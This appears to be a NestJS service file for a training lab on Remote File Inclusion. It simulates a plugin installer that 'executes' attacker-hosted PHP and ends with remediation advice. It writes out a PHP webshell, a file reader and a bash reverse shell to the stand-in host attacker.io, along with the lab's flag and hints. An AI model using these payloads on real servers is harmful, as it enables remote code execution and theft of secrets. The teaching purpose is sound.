// src/modules/practice-labs/file-inclusion/labs/lab4/lab4.service.ts
import { Injectable, BadRequestException } from '@nestjs/common';
import { PrismaService } from '../../../../../core/database';
import { PracticeLabStateService } from '../../../shared/services/practice-lab-state.service';

@Injectable()
export class Lab4Service {
  private readonly ETC_FLAG =
    'CMS_DB_ROOT_PASS=C0rp_DB_R00t_2024!\nADMIN_API_TOKEN=tok_live_pluginhub_secret_xyz\nFLAG=FLAG{RFI_REMOTE_FILE_INCLUSION_PLUGIN_WEBSHELL_RCE}';

  // الـ payloads الخبيثة على attacker server المُحاكى
  private readonly attackerPayloads: Record<
    string,
    { description: string; code: string }
  > = {
    'webshell.php': {
      description: 'Basic PHP webshell — executes system commands via ?cmd=',
      code: '<?php if(isset($_GET["cmd"])) { echo shell_exec($_GET["cmd"]); } ?>',
    },
    'info.php': {
      description: 'PHP info — reveals server configuration',
      code: '<?php phpinfo(); ?>',
    },
    'reverse_shell.php': {
      description: 'Reverse shell — connects back to attacker',
      code: '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/attacker.io/4444 0>&1\'"); ?>',
    },
    'file_reader.php': {
      description: 'File reader — reads any server file via ?file=',
      code: '<?php echo file_get_contents($_GET["file"]); ?>',
    },
  };

  private readonly cmdOutputs: Record<string, string> = {
    whoami: 'www-data',
    id: 'uid=33(www-data) gid=33(www-data)',
    hostname: 'pluginhub-cms-prod',
    'uname -a': 'Linux pluginhub-cms-prod 5.15.0-1034-aws #38-Ubuntu',
    'cat /etc/flag':
      'CMS_DB_ROOT_PASS=C0rp_DB_R00t_2024!\nADMIN_API_TOKEN=tok_live_pluginhub_secret_xyz\nFLAG=FLAG{RFI_REMOTE_FILE_INCLUSION_PLUGIN_WEBSHELL_RCE}',
    'cat /etc/passwd':
      'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
    'ls /var/www/html': 'index.php\nconfig.php\nplugins\nuploads\n.env',
    'cat /var/www/html/.env':
      'APP_KEY=base64:xyz\nDB_PASS=H3aven_DB!\nADMIN_SECRET=tok_live_pluginhub_secret_xyz',
  };

  constructor(
    private prisma: PrismaService,
    private stateService: PracticeLabStateService,
  ) {}

  async initLab(userId: string, labId: string) {
    return this.stateService.initializeState(userId, labId);
  }

  async listPlugins(userId: string, labId: string) {
    return {
      success: true,
      installedPlugins: [
        {
          name: 'SEO Optimizer',
          version: '2.3.1',
          source: 'https://plugins.pluginhub.io/seo',
        },
        {
          name: 'Image Gallery',
          version: '1.8.0',
          source: 'https://plugins.pluginhub.io/gallery',
        },
        {
          name: 'Contact Form',
          version: '3.0.2',
          source: 'https://plugins.pluginhub.io/forms',
        },
      ],
      usage: 'POST /plugins/install with { "pluginUrl": "https://..." }',
      phpConfig: {
        allow_url_include: 'On', // ❌ الثغرة
        allow_url_fopen: 'On',
      },
    };
  }

  async getAttackerPayloads(userId: string, labId: string) {
    const payloads = Object.entries(this.attackerPayloads).map(
      ([file, info]) => ({
        url: `http://attacker.io/${file}`,
        file,
        description: info.description,
        usage: `pluginUrl: "http://attacker.io/${file}"${file === 'webshell.php' ? ', cmd: "whoami"' : ''}`,
      }),
    );

    return {
      success: true,
      attackerServer: 'http://attacker.io (simulated)',
      note: 'These payloads are hosted on your simulated attacker server. Pass their URLs to /plugins/install.',
      payloads,
    };
  }

  // ❌ الثغرة: RFI — يُحمّل ويُنفّذ remote PHP
  async installPlugin(
    userId: string,
    labId: string,
    pluginUrl: string,
    cmd: string,
  ) {
    if (!pluginUrl) throw new BadRequestException('pluginUrl is required');

    const isRemote =
      pluginUrl.startsWith('http://') || pluginUrl.startsWith('https://');
    const isAttackerUrl = pluginUrl.includes('attacker.io');
    const matchedFile = Object.keys(this.attackerPayloads).find((f) =>
      pluginUrl.includes(f),
    );

    if (!isRemote) {
      return {
        success: false,
        error: 'Invalid plugin URL — must start with http:// or https://',
      };
    }

    if (!isAttackerUrl || !matchedFile) {
      return {
        success: true,
        installed: true,
        pluginUrl,
        message: 'Plugin fetched and installed from remote URL.',
        note: 'Try hosting a malicious payload at attacker.io — check /attacker/payloads',
      };
    }

    // ❌ الثغرة: تنفيذ الـ remote PHP payload
    const payload = this.attackerPayloads[matchedFile];
    const isWebshell = matchedFile === 'webshell.php';
    const isFileReader = matchedFile === 'file_reader.php';

    let executionOutput = '';
    let isExploited = false;

    if (isWebshell && cmd) {
      executionOutput = this.cmdOutputs[cmd] ?? `(executed: ${cmd})`;
      isExploited = executionOutput.includes('FLAG{');
    } else if (isFileReader && cmd) {
      const filePath = cmd;
      executionOutput =
        filePath === '/etc/flag' ? this.ETC_FLAG : `(read: ${filePath})`;
      isExploited = executionOutput.includes('FLAG{');
    } else {
      executionOutput = `Remote PHP file fetched and executed:\n${payload.code}`;
    }

    await this.prisma.labGenericLog.create({
      data: {
        userId,
        labId,
        type: 'RFI',
        action: 'REMOTE_FILE_INCLUDE',
        meta: { pluginUrl, matchedFile, cmd, isExploited },
      },
    });

    return {
      success: true,
      exploited: isExploited,
      rfi: true,
      remoteFile: `http://attacker.io/${matchedFile}`,
      fetchedCode: payload.code,
      executionOutput,
      ...(isExploited && {
        flag: 'FLAG{RFI_REMOTE_FILE_INCLUSION_PLUGIN_WEBSHELL_RCE}',
        vulnerability:
          'Remote File Inclusion (RFI) — allow_url_include Enabled',
        impact:
          'Full RCE achieved by including a remote attacker-controlled PHP file. No file upload needed.',
        fix: [
          'Set allow_url_include = Off in php.ini (disabled by default in PHP 7.4+)',
          'Whitelist allowed plugin sources — only accept plugins from trusted domains',
          'Never use user-supplied URLs in file include operations',
          'Validate and sandbox plugin execution in isolated environments',
          'Use composer packages instead of URL-based plugin installation',
        ],
      }),
      ...(!isExploited &&
        isAttackerUrl && {
          hint:
            matchedFile === 'webshell.php'
              ? 'Webshell loaded! Add "cmd" parameter: { "cmd": "cat /etc/flag" }'
              : 'Payload executed! Try webshell.php with cmd parameter for RCE.',
        }),
    };
  }
}
